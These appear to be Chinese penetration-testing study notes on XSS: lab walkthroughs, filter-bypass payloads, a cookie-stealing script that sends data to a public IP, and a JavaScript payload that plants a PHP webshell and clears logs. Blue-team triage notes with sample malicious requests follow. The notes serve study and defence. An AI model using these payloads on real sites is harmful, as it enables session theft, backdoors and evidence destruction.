### XSS跨站脚本攻击

漏洞原理：接受JS代码，输出JS代码解释执行

网站输出的内容，输入数据能控制。



#### 黑盒XSS手工分析

1、页面中显示的数据找可控的（有些隐藏的）
2、利用可控地方发送JS代码去看执行加载情况
3、成功执行即XSS，不能成功就看语句输出的地方显示（过滤）
4、根据显示分析为什么不能执行（实体化，符号括起来，关键字被删除等）

#### 绕过常用标签

[xss常用标签绕过总结1](https://xz.aliyun.com/t/12370?time__1311=mqmhD57KAIe%2BOxBqDTnxUxtNtG%3DuUtD8beD)

[xss常用标签绕过总结2](https://xz.aliyun.com/t/4067)





#### 反射型（非持续性）

接受正常的输出，将其更改后执行js代码

![image-20240429095429337](D:\Infiltration\笔记\note\图片\image-20240429095429337.png)

执行了js弹窗

```
x=<script>alert(1)</script>
```

![image-20240429095532956](D:\Infiltration\笔记\note\图片\image-20240429095532956.png)







标签换成<img执行刚刚的xss语句，并不能执行成功

```
x=<script>alert(1)</script>
```

![image-20240429214504533](D:\Infiltration\笔记\note\图片\image-20240429214504533.png)

查看源代码xss语句需要绕过，[](https://www.freebuf.com/articles/web/340080.html)



![image-20240429214638236](D:\Infiltration\笔记\note\图片\image-20240429214638236.png)

如果报错就执行“alert(1)”

```
x onerror="alert(1)">
```

![image-20240429215309505](D:\Infiltration\笔记\note\图片\image-20240429215309505.png)



查看源代码可以看到，js语句已经拼接成功

![image-20240429215424417](D:\Infiltration\笔记\note\图片\image-20240429215424417.png)



嵌套xiaodi8.com

```
x=<iframe%20src%20="http://www.xiaodi8.com">test</iframe>
```

![image-20240429095806024](D:\Infiltration\笔记\note\图片\image-20240429095806024.png)



##### 案例



可以看到http accept被显示出来，并且是我们可以控制的。

![image-20240429221702421](D:\Infiltration\笔记\note\图片\image-20240429221702421.png)

burp抓包添加js语句

```
<script>alert(1)<script>
```



![image-20240429221434298](D:\Infiltration\笔记\note\图片\image-20240429221434298.png)

放包后成功弹窗

![image-20240429221509544](D:\Infiltration\笔记\note\图片\image-20240429221509544.png)





#### 存储型(持续性)

持续化的XSS攻击方式，将恶意代码存储于服务器，当其他用户再次访问时触发，造成XSS攻击。

##### 案例

后台有登录日志



![image-20240502132603392](D:\Infiltration\笔记\note\图片\image-20240502132603392.png)



重新回到登录框，构造js语句

```
<script>alert(123)</script>
```

![image-20240502134035334](D:\Infiltration\笔记\note\图片\image-20240502134035334.png)



再登录后台，js语句执行成功

![image-20240502134159677](D:\Infiltration\笔记\note\图片\image-20240502134159677.png)



查看源代码可以看到js语句



![image-20240506084358202](D:\Infiltration\笔记\note\图片\image-20240506084358202.png)



#### Dom型(非持续性)

通过修改原始的客户端代码，受害者浏览器的DOM环境改变，导致有效载荷的执行。
页面本身没有变化，但由于DOM环境被恶意修改，有客户端代码被包含进了页面并执行。

##### 案例

Google语法

```
edu.cn inurl:url=http
```





利用就将js语句更改

```
url=javascript:alert(1)
```

![image-20240506092744891](D:\Infiltration\笔记\note\图片\image-20240506092744891.png)





#### SVG-xss



在svg文件中插入js语句

![image-20240506100143737](D:\Infiltration\笔记\note\图片\image-20240506100143737.png)





上传svg文件，但是文件不支持，直接复制图片地址

![image-20240506100602553](D:\Infiltration\笔记\note\图片\image-20240506100602553.png)



访问弹窗

![image-20240506100647340](D:\Infiltration\笔记\note\图片\image-20240506100647340.png)







#### PDF-xss

使用pdf编辑器，打开属性，添加动作，选择执行js语句

```
app.alert(1)
```

![image-20240506113256402](D:\Infiltration\笔记\note\图片\image-20240506113256402.png)





上传pdf到网站

![image-20240506113443299](D:\Infiltration\笔记\note\图片\image-20240506113443299.png)







访问网站链接，执行xss



![image-20240506113519968](D:\Infiltration\笔记\note\图片\image-20240506113519968.png)



#### Flash-xss





使用网站上的本身有的swf文件进行反编译，常见的可触发xss的危险函数有：getURL，navigateToURL，ExternalInterface.call，htmlText，loadMovie等等

fofa语法

```&&
"phpwind" && icon_hash="-1005349246"
```



查找到ExternalInterface.call

![image-20240506134749733](D:\Infiltration\笔记\note\图片\image-20240506134749733.png)





获取jsobject的变量再用到ExternalInterface.call

![image-20240506134852162](D:\Infiltration\笔记\note\图片\image-20240506134852162.png)





```
uploader.swf?jsobject=alert(1)
```

因为配置问题访问swf文件直接下载，就复现不了。

#### cookie盗取

##### 小皮面板

谷歌浏览器充当攻击者，edge浏览器充当管理员



搭建[xss平台](https://github.com/epoch99/BlueLotus_XSSReceiver-master)，配置好获取cookie的js

![image-20240507143658618](D:\Infiltration\笔记\note\图片\image-20240507143658618.png)



生成payload

![image-20240507144030904](D:\Infiltration\笔记\note\图片\image-20240507144030904.png)



将js语句插入到有xss漏洞中

![image-20240507144210304](D:\Infiltration\笔记\note\图片\image-20240507144210304.png)



当管理员登录到后台后会获取到cookie

![image-20240507144319277](D:\Infiltration\笔记\note\图片\image-20240507144319277.png)





复制cookie信息到cookie插件中保存

![image-20240507143517465](D:\Infiltration\笔记\note\图片\image-20240507143517465.png)









访问后台地址http://192.168.100.102:9080/10F34D#/home/logs/成功访问到后台



![image-20240507143542157](D:\Infiltration\笔记\note\图片\image-20240507143542157.png)



#### xss靶场

绕过

##### 第一关

![image-20240507190742247](D:\Infiltration\笔记\note\图片\image-20240507190742247.png)









![image-20240507190820262](D:\Infiltration\笔记\note\图片\image-20240507190820262.png)





























##### 第二关

直接输入js语句无法执行，F12打开对应位置，看到有引号

![image-20240507190956849](D:\Infiltration\笔记\note\图片\image-20240507190956849.png)



直接引号闭合

```
"><script>alert(1)</script>
```

![image-20240507191348560](D:\Infiltration\笔记\note\图片\image-20240507191348560.png)



##### 第三关

实体化标签

![image-20240507193733393](D:\Infiltration\笔记\note\图片\image-20240507193733393.png)

使用标签事件绕过

```
' onfocus=javascript:alert() '
```

![image-20240507194549987](D:\Infiltration\笔记\note\图片\image-20240507194549987.png)





##### 第四关



![image-20240507194956746](D:\Infiltration\笔记\note\图片\image-20240507194956746.png)



```
”onfocus=javascript:alert()
```

![image-20240507195133395](D:\Infiltration\笔记\note\图片\image-20240507195133395.png)

##### 第五关

on被过滤利用其它标签绕过

![image-20240507195215907](D:\Infiltration\笔记\note\图片\image-20240507195215907.png)





```
"> <a href=javascript:alert()>xxx</a> <"
```

![image-20240507195757172](D:\Infiltration\笔记\note\图片\image-20240507195757172.png)



##### 第六关





   

```
<script>alert(1)</script>
```

script被过滤

![image-20240507200150773](D:\Infiltration\笔记\note\图片\image-20240507200150773.png)

大小写绕过

```
"><script>alert(1)</script><"
```

![image-20240507200849322](D:\Infiltration\笔记\note\图片\image-20240507200849322.png)

##### 第七关

过滤了script

```
<script>alert(1)</script>
```

![image-20240507200951313](D:\Infiltration\笔记\note\图片\image-20240507200951313.png)

双写绕过	

```
"><scrscriptipt>alert(1)</scrscriptipt><"
```

![image-20240507222134077](D:\Infiltration\笔记\note\图片\image-20240507222134077.png)





##### 第八关



![image-20240507223209690](D:\Infiltration\笔记\note\图片\image-20240507223209690.png)





过滤script，大小写双写都不能绕过

![image-20240507223627630](D:\Infiltration\笔记\note\图片\image-20240507223627630.png)

unicode编码

```
javascript:alert(1)
&#x006a&#x0061&#x0076&#x0061&#x0073&#x0063&#x0072&#x0069&#x0070&#x0074&#x003a&#x0061&#x006c&#x0065&#x0072&#x0074&#x0028&#x0031&#x0029
```

![image-20240507223340398](D:\Infiltration\笔记\note\图片\image-20240507223340398.png)



![image-20240507223650747](D:\Infiltration\笔记\note\图片\image-20240507223650747.png)

##### 第九关

![image-20240507224234929](D:\Infiltration\笔记\note\图片\image-20240507224234929.png)



需要字符串中带有http://



![image-20240507224215886](D:\Infiltration\笔记\note\图片\image-20240507224215886.png)

unicode编码

```
javascript:alert(1)
&#x006a&#x0061&#x0076&#x0061&#x0073&#x0063&#x0072&#x0069&#x0070&#x0074&#x003a&#x0061&#x006c&#x0065&#x0072&#x0074&#x0028&#x0031&#x0029
```

![image-20240507225052336](D:\Infiltration\笔记\note\图片\image-20240507225052336.png)

拼接上http://

```
&#x006a&#x0061&#x0076&#x0061&#x0073&#x0063&#x0072&#x0069&#x0070&#x0074&#x003a&#x0061&#x006c&#x0065&#x0072&#x0074&#x0028&#x0031&#x0029;('http://')
```

![image-20240507225145152](D:\Infiltration\笔记\note\图片\image-20240507225145152.png)





##### 第十关

隐藏属性触发闭合



![image-20240507225940906](D:\Infiltration\笔记\note\图片\image-20240507225940906.png)

修改标签鼠标点击触发js语句

```
?t_sort=" onfocus=javascript:alert() type="text
```

![image-20240507230046108](D:\Infiltration\笔记\note\图片\image-20240507230046108.png)



#### XSS工具

[项目地址](https://github.com/s0md3v/XSStrike)



```
python xsstrike.py -u "http://192.168.100.2:1002/level11.php"
```

![image-20240507232728129](D:\Infiltration\笔记\note\图片\image-20240507232728129.png)

复制payload成功绕过

![image-20240507232650763](D:\Infiltration\笔记\note\图片\image-20240507232650763.png)













































```
漏洞原理：接受输入数据，输出显示数据后解析执行
基础类型：反射(非持续)，存储(持续)，DOM-BASE
拓展类型：jquery，mxss，uxss，pdfxss，flashxss，上传xss等
常用标签：https://www.freebuf.com/articles/web/340080.html
攻击利用：盲打，COOKIE盗取，凭据窃取，页面劫持，网络钓鱼，权限维持等
安全修复：字符过滤，实例化编码，http_only，CSP防护，WAF拦截等
测试流程：看输出想输入在哪里，更改输入代码看执行（标签，过滤决定）

#XSS跨站-攻击利用-凭据盗取
条件：无防护Cookie凭据获取
利用：XSS平台或手写接受代码
触发：<script>var url='http://47.94.236.117/getcookie.php?u='+window.location.href+'&c='+document.cookie;document.write("<img src="+url+" />");</script>
接受：
<?php
$url=$_GET['u'];
$cookie=$_GET['c'];
$fp = fopen('cookie.txt',"a");
fwrite($fp,$url."|".$cookie."\n");
fclose($fp);
?>

#XSS跨站-攻击利用-数据提交
条件：熟悉后台业务功能数据包，利用JS写一个模拟提交
利用：凭据获取不到或有防护无法利用凭据进入时执行其他
<script src="http://xx.xxx.xxx/poc.js"></script>
function poc(){
  $.get('/service/app/tasks.php?type=task_list',{},function(data){
    var id=data.data[0].ID;
    $.post('/service/app/tasks.php?type=exec_task',{
      tid:id
    },function(res2){
        $.post('/service/app/log.php?type=clearlog',{
            
        },function(res3){},"json");
        
      
    },"json");
  },"json");
}
function save(){
  var data=new Object();
  data.task_id="";
  data.title="test";
  data.exec_cycle="1";
  data.week="1";
  data.day="3";
  data.hour="14";
  data.minute = "20";
  data.shell='echo "<?php @eval($_POST[123]);?>" >C:/xp.cn/www/wwwroot/admin/localhost_80/wwwroot/1.php';
  $.post('/service/app/tasks.php?type=save_shell',data,function(res){
    poc();
  },'json');
}
save();

#XSS跨站-攻击利用-网络钓鱼
1、部署可访问的钓鱼页面并修改
2、植入XSS代码等待受害者触发
3、将后门及正常文件捆绑打包免杀
https://github.com/r00tSe7en/Fake-flash.cn

#XSS跨站-攻击利用-溯源综合
1、XSS数据平台-XSSReceiver
简单配置即可使用，无需数据库，无需其他组件支持
搭建：https://github.com/epoch99/BlueLotus_XSSReceiver-master
2、浏览器控制框架-beef-xss
只需执行JS文件，即可实现对当前浏览器的控制，可配合各类手法利用
搭建：docker run --rm -p 3000:3000 janes/beef

```





```
注意事项
不要乱发朋友圈，现场不要聊薪资问题，聊这个护网走的哪家。遇见问题去和项目经理沟通。

参加过护网（按照实际案例去说）
问用没用过安全产品
奇安信天眼，深信服nip 微步sip 长亭的雷池waf 谛听蜜罐。默安的幻阵蜜罐，安塞的ids 科莱的全流量 天融信的僵木蠕，长亭APT预警。

研判分析
怎么去判断是不是误报
①去跟甲方去沟通
②看请求数据包，明显带了恶意参数,
?Jsp=system（“whoami;”）
看回显包，文件上传误报，/www/bumen/员工信息表.docx
看回显包
success 文件位置  www.baidu.com/www/shell.jsp 


研判分析是否攻击成功  疑似攻击成功
主要是看回显包，whoami  ipconfig id
看回显包状态码 200 302 403 404 401 503
Yewu/administrator
IP 1.1.1.1
Dns 1.1.1.1
Root uid 0 
研判是直接写入的攻击
如果复现 去做镜像复现。
如果写入文件的，可以上服务器去排查是否存在这个文件。
Webshell的研判，看回显是否有上传路径
Success 文件上传位置 /www/20230410.jsp
文件上传失败 不允许上传脚本文件

判断是否是真实攻击
负载均衡 （去沟通是否为负载均衡）
10.1.1.1  文件上传 10.1.1.2（web官网）
10.1.1.1  命令执行 10.1.1.3（oa）
10.1.1.1  代码注入 10.1.1.4（业务系统）
XFF头真实的IP地址 39.1.1.1 阿里云服务器

蠕虫病毒攻击
170.1.1.1（马尼拉） 代码执行攻击  1.1.1.1
169.1.1.1（美国 科纳里来州）远程注入 1.1.1.1
印度美国有僵尸网络
www.baidu.com/?Shell.php wget http://asdsd.ov/wakang.sh chmod +x ./wakang.sh -o 1.1.1.1
404
内网存在可疑外链，员工或者客服部门 电脑存在外链。
看他外链的地址。IP你解析之后 www.2345.com  www.小黑记事本.com 
员工去下载一些软件，软件园去下载，里边会捆包一些流氓软件。他去下载流氓软件 没有经过客户端认证。
下载软件-软件自动请求下载-并且安装程序。
疑似主机被控

应急响应
看进程、查看后门、看注册表、看启动项。X
正确的流程：
首先判断严重程度：看是否已经攻击成功了，如果攻击成功了，隔离主机（隔断和内网重要资产通讯），
判断是什么类型的攻击
第一种：命令执行攻击 回显敏感内容了，记录攻击成功时间，然后去全流量设备去查看这个IP 被攻击时间段有无其他流量对内网传输，4/27 18/44  18、55
11分钟  空白期有没有对内网其他主机进行攻击，排查内网其他主机是否失陷，上机排查，edr 是什么漏洞攻击的 如果是文件上传的，看看是怎么上传的，把上传点修复，如果是后台弱口令。

看进程、查看后门、看注册表、看启动项。

0day防御 分为两种
已知0day未攻击成功
OA 如果有poc去对应漏洞点去封禁
Waf的策略， /oa/yanzheng.jsp?System=whoami
yanzheng.jsp 限制访问这个文件地址 403
当前文件触发位置可更改。Yz.jsp  404
已被攻击怀疑是0day
攻击成功之后，进行扫描了，内网IPS IDS 会告警有攻击。反溯源，查看第一入口点是哪里 40 

0day防御 分为两种
已知0day未攻击成功
OA或者一些框架漏洞 
如果有poc去对应漏洞点去封禁
Waf的策略， /oa/yanzheng.jsp?System=whoami
yanzheng.jsp 限制访问这个文件地址 
当前请求存在危险行为 已被waf拦截
403
WAF的策略是可以设置参数的
/oa/yanzheng.jsp?System=whoami
引用这个文件的时候，如果URL中出现了system字符串的话，对整体数据包进行拦截。
/oa/yanzheng.jsp?System=whoami
当前请求存在危险行为 已被waf拦截
POST /x.shell HTTP 1.0 
Cookie:19993
Context-type:system(“whoami”)
引用这个文件的时候，如果请求包Context-type出现system字符串的话，对整体数据包进行拦截。
当前请求存在危险行为 已被waf拦截
已被攻击怀疑是0day
出现内网扫描了，但是外网服务器并未监测到攻击成功的行为，
10.1.1.1(39.9.9.9（web官网服务器）) ->  代码执行攻击  ->  10.1.1.2 
10.1.1.1  18.02  10.1.1.2 
去看全流量 18.02 之前他的所有流量
全流量设备去匹配text:system

蓝队防守应该着重哪些点去防守
①边缘资产
Baidu.com
111.Baidu.com 系统优化好，做过测评，定期检查，有服务商维护，全部接入安全产品
222.baidu.com
Fofa yingtu 
333.baidu.com 没有在资产表，设备接入内网，但没有接入安全产品，系统版本老，漏洞多，没人维护
333.2222.baidu.com
②客户的管理系统后台
www.Baidu.com
www-admin.baidu.com(不对外开放)运维人员每天晚上6点需要上传当天集团的一个开会总结
每天晚上6点到6.30分开放对外。建议加班
通过vpn去访问
24小时对这个子域名进行存活探测。存活直接短信提醒。Admin admin888 

真实的红队攻击
护网过程中 每天可能会有上万条攻击告警
红队攻击会短时间存在大量POC验证攻击
39.1.1.1 -> 命令注入 10.1.1.1     
39.1.1.1 -> 代码执行 10.1.1.2
39.1.1.1 -> 文件上传 10.1.1.3
39.1.1.1 -> SQL注入攻击 10.1.1.4
39.1.1.2 -> 挖矿 10.1.1.1     
11.1.1.1 -> 蠕虫病毒 10.1.1.2
170.1.1.1 -> 僵尸网络扩散 10.1.1.3
169.0.0.1 -> F5-big注入 10.1.1.4

溯源 反制
溯源 找到攻击者本人画像，比如身份证 微步去查ip，QQ号 SGK 
溯源整体过程
从整个事件的一个还原和梳理过程，以及反制的手法及成果
被攻击之后，能发现攻击的入口点，已经整体的攻击流量过程，并且还原攻击手法，然后能反制攻击者本人
```











